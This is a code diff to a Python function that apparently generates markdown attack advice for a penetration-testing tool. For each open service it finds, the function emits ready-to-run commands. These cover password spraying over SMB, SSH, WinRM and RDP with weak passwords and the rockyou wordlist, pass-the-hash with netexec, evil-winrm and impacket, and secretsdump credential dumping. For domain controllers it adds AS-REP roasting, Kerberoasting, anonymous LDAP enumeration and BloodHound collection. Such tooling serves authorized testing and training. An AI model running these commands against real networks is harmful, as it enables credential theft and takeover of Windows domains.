@@ -325,6 +325,189 @@ def generate_advisor_markdown(info: "TargetInfo", lhost: str = "<LHOST>") -> str
             "",
         ]
 
+    # ── Gap 1: Credential Chain Attack Surface ────────────────────────────
+    # Triggered whenever usernames were discovered AND at least one service
+    # that accepts username/password authentication is reachable.
+    _spray_ports = {22, 139, 445, 3389, 5985, 5986}
+    if info.users_found and (info.open_ports & _spray_ports):
+        ip = info.ip
+        users_file = f"output/targets/{ip}/users.txt"
+        lines += [
+            "### 🔑 Credential Chain Attack Surface",
+            "",
+            f"> **{len(info.users_found)} username(s) discovered** and stored in "
+            f"`{users_file}`  ",
+            "> Spray each open service — check the lockout policy first.",
+            "",
+        ]
+
+        if 445 in info.open_ports or 139 in info.open_ports:
+            lines += [
+                "**SMB spray (netexec):**",
+                "",
+                "```bash",
+                f"# Password spray — one password across all users",
+                f"nxc smb {ip} -u {users_file} -p '<PASSWORD>' --continue-on-success",
+                f"# Common weak patterns",
+                f"nxc smb {ip} -u {users_file} -p 'Password123' --continue-on-success",
+                f"nxc smb {ip} -u {users_file} -p '' --continue-on-success",
+                "```",
+                "",
+            ]
+
+        if 22 in info.open_ports:
+            lines += [
+                "**SSH spray (hydra):**",
+                "",
+                "```bash",
+                f"hydra -L {users_file} -p '<PASSWORD>' ssh://{ip}",
+                f"hydra -L {users_file} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4",
+                "```",
+                "",
+            ]
+
+        if 5985 in info.open_ports or 5986 in info.open_ports:
+            lines += [
+                "**WinRM spray (netexec):**",
+                "",
+                "```bash",
+                f"nxc winrm {ip} -u {users_file} -p '<PASSWORD>' --continue-on-success",
+                "```",
+                "",
+            ]
+
+        if 3389 in info.open_ports:
+            lines += [
+                "**RDP spray (hydra / netexec):**",
+                "",
+                "```bash",
+                f"nxc rdp {ip} -u {users_file} -p '<PASSWORD>' --continue-on-success",
+                f"hydra -L {users_file} -p '<PASSWORD>' rdp://{ip}",
+                "```",
+                "",
+            ]
+
+    # ── Gap 2: Pass-the-Hash ──────────────────────────────────────────────
+    # Triggered when NTLM hashes have been captured AND SMB or WinRM is open.
+    _pth_ports = {139, 445, 5985, 5986}
+    if info.ntlm_hashes_found and (info.open_ports & _pth_ports):
+        ip = info.ip
+        lines += [
+            "### 🔓 Pass-the-Hash Attack Surface",
+            "",
+            "> **NTLM hashes captured** — attempt direct authentication without cracking.",
+            "> Replace `<USER>` and `<HASH>` with values from your loot.",
+            "",
+        ]
+
+        if 445 in info.open_ports or 139 in info.open_ports:
+            lines += [
+                "**SMB PtH (netexec):**",
+                "",
+                "```bash",
+                f"nxc smb {ip} -u '<USER>' -H '<NTLM_HASH>'",
+                f"nxc smb {ip} -u '<USER>' -H '<NTLM_HASH>' --shares",
+                f"nxc smb {ip} -u '<USER>' -H '<NTLM_HASH>' -x 'whoami'",
+                "```",
+                "",
+            ]
+
+        if 5985 in info.open_ports or 5986 in info.open_ports:
+            lines += [
+                "**WinRM PtH (evil-winrm / netexec):**",
+                "",
+                "```bash",
+                f"evil-winrm -i {ip} -u '<USER>' -H '<NTLM_HASH>'",
+                f"nxc winrm {ip} -u '<USER>' -H '<NTLM_HASH>'",
+                "```",
+                "",
+            ]
+
+        lines += [
+            "**Impacket suite (exec / secretsdump):**",
+            "",
+            "```bash",
+            f"impacket-psexec '<USER>'@{ip} -hashes ':<NTLM_HASH>'",
+            f"impacket-wmiexec '<USER>'@{ip} -hashes ':<NTLM_HASH>'",
+            f"impacket-secretsdump '<USER>'@{ip} -hashes ':<NTLM_HASH>'",
+            "```",
+            "",
+        ]
+
+    # ── Gap 4: Active Directory DC Attack Surface ─────────────────────────
+    # Triggered when this host is confirmed (or inferred) to be a DC.
+    if info.is_domain_controller:
+        ip     = info.ip
+        domain = info.domain or "<DOMAIN>"
+        users_file = f"output/targets/{ip}/users.txt"
+        lines += [
+            "### 🏰 Active Directory Attack Surface",
+            "",
+            f"> **Domain Controller confirmed** — `{ip}` (domain: `{domain}`)  ",
+            "> Run these enumeration steps in order.  ",
+            "> Replace `<DOMAIN>` if the domain name was not auto-detected.",
+            "",
+        ]
+
+        lines += [
+            "**AS-REP Roasting** *(no pre-auth required — no credentials needed)*:",
+            "",
+            "```bash",
+            f"# With user list (discovered users)",
+            f"impacket-GetNPUsers {domain}/ -usersfile {users_file} "
+            f"-format hashcat -dc-ip {ip} -no-pass",
+            f"# Blind (enumerate via LDAP anonymous bind first)",
+            f"impacket-GetNPUsers {domain}/ -dc-ip {ip} -no-pass -request",
+            "```",
+            "",
+        ]
+
+        lines += [
+            "**Kerberoasting** *(requires valid credentials)*:",
+            "",
+            "```bash",
+            f"impacket-GetUserSPNs {domain}/'<USER>:<PASS>' -dc-ip {ip} -request",
+            f"nxc ldap {ip} -u '<USER>' -p '<PASS>' --kerberoasting kerberoast.txt",
+            "```",
+            "",
+        ]
+
+        lines += [
+            "**Anonymous LDAP Enumeration** *(no credentials needed)*:",
+            "",
+            "```bash",
+            f"windapsearch.py -d {domain} --dc-ip {ip} -U",
+            f"ldapsearch -x -H ldap://{ip} -b 'DC={',DC='.join(domain.split('.')) if '.' in domain else domain}' '(objectClass=user)' sAMAccountName",
+            f"nxc ldap {ip} -u '' -p '' --users",
+            "```",
+            "",
+        ]
+
+        lines += [
+            "**BloodHound Collection** *(authenticated — map the full attack path)*:",
+            "",
+            "```bash",
+            f"# With password",
+            f"nxc ldap {ip} -u '<USER>' -p '<PASS>' --bloodhound --collection All",
+            f"# With hash (PtH)",
+            f"nxc ldap {ip} -u '<USER>' -H '<NTLM_HASH>' --bloodhound --collection All",
+            f"# Alternatively with bloodhound-python",
+            f"bloodhound-python -u '<USER>' -p '<PASS>' -d {domain} -dc {ip} -c All",
+            "```",
+            "",
+        ]
+
+        if info.users_found:
+            lines += [
+                "**Password Spray** *(check lockout policy first — AS-REP roast gives you hashes to crack first)*:",
+                "",
+                "```bash",
+                f"kerbrute passwordspray --dc {ip} -d {domain} {users_file} 'Password123'",
+                f"nxc smb {ip} -u {users_file} -p 'Password123' --continue-on-success",
+                "```",
+                "",
+            ]
+
     # ── Pivot Rule 2: Always include tunnelling tools ─────────────────────
     pivot_tools = PIVOT_TOOLS_WINDOWS if os_type == "Windows" else PIVOT_TOOLS_LINUX
     lines += [
